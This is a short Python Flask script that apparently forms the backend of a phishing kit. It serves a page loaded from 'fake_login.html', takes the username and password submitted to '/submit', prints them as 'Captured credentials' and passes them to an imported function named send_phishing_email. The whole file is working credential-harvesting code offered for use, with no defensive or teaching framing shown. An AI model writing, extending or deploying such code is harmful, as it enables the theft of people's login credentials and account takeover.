from flask import Flask, request, render_template_string
from send_email import send_phishing_email

app = Flask(__name__)

@app.route('/')
def home():
    return render_template_string(open('fake_login.html').read())

@app.route('/submit', methods=['POST'])
def submit():
    print(request.form)  
    try:
        username = request.form['username']
        password = request.form['password']
        print(f"Captured credentials: {username}, {password}")
        sender_email = "enteryouremailcredentials@example.com"
        receiver_email = username
        send_phishing_email(sender_email, receiver_email, username, password)
        return "Login successful! Check your email for further details."
    except KeyError as e:
        return f"Error: {e} field missing", 400

if __name__ == '__main__':
    app.run(debug=True)
